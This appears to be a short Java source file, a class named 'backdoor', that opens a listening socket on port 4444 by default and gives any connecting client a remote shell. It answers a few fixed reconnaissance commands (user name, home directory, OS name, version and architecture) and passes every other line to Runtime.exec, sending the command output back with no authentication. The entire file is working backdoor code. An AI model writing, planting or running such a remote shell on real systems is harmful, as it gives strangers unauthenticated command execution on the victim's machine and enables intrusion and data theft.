import java.io.*;
import java.net.*;
import java.lang.*;

public class backdoor {

	public static void main(String[] args){
		try{
			final int serverPort = args.length == 1 ? Integer.valueOf(args[0]) : 4444;
			
			ServerSocket serverSocket = new ServerSocket(serverPort);
			ProcessBuilder processBuilder = new ProcessBuilder();

			while(true){
				Socket clientSocket = serverSocket.accept();
				
				InputStreamReader isr = new InputStreamReader(clientSocket.getInputStream());
				BufferedReader in = new BufferedReader(isr);

				OutputStreamWriter osr = new OutputStreamWriter(clientSocket.getOutputStream());
				PrintWriter out = new PrintWriter(osr, true);
				
				String dir = System.getProperty("user.dir");
				String name = System.getProperty("user.name");

				loop: while(true){
					out.print("[" + name + " " + dir + "]> ");
					out.flush();
					String request = in.readLine();
					
					switch(request){
						case "QUIT":
							break loop;
						case "CMDLIST":
							out.println("\tQUIT      exit from shell");
							out.println("\tGETHOME   return the user home path");
							out.println("\tGETDIR    return the current direcotry path");
							out.println("\tGETNAME   return the user name");
							out.println("\tOSARCH    return the Operating System architecture");
							out.println("\tOSNAME    return the Operating System name");
							out.println("\tOSVERS    return the Operating System version");							
							break;
						case "GETHOME":
							out.println(System.getProperty("user.home"));
							break;
						case "GETDIR":
							out.println(System.getProperty("user.dir"));
							break;
						case "GETNAME":
							out.println(System.getProperty("user.name"));
							break;	
						case "OSARCH":
							out.println(System.getProperty("os.arch"));
							break;
						case "OSNAME":
							out.println(System.getProperty("os.name"));
							break;
						case "OSVERS":
							out.println(System.getProperty("os.version"));
							break;
						default:
							try{
								Process process = Runtime.getRuntime().exec(request);
								StringBuilder output = new StringBuilder();

								BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
								String line;
								while ((line = reader.readLine()) != null) {
									out.println(line);
								}
								process.waitFor();
							} catch(IOException e){
								out.println("Error: command not found");
							}
							break;						
					}
					
				}
							
				in.close();
				out.close();
				clientSocket.close();
				break;
			}


		} catch(Exception e){
			e.printStackTrace();
		}
	}

}

